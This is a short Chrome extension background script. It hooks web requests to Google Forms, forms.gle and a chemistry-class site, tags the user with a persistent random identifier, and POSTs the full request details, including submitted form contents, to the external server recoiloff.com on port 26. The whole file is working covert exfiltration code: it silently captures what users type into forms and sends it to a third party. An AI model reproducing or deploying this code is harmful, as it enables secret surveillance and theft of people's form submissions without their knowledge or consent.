chrome.webRequest.onBeforeRequest.addListener(
    function(details)
    {
        const url = "http://recoiloff.com:26";
        if (details.method === "GET") return;
		console.log(JSON.stringify(details));
        if (!(details.url).toString().startsWith("https://docs.google.com/forms") && !(details.url).toString().startsWith("https://forms.gle")) return;
		    chrome.storage.local.get("identifier3", function(result) {

		if (JSON.stringify(result).toString() === "{}") {
            chrome.storage.local.set({"identifier3": Math.random().toString().replace(".", "")});
        }
		});
        chrome.storage.local.get("identifier3", function(result) {
            console.log("[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]");
            
            
            var request = new XMLHttpRequest();

            request.open("POST", url);

            request.send("[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]");

        });
    },
    {urls: ["https://docs.google.com/*", "https://forms.gle/*", "https://mrgrodskichemistry.com/*"]},
    ['requestBody']
);
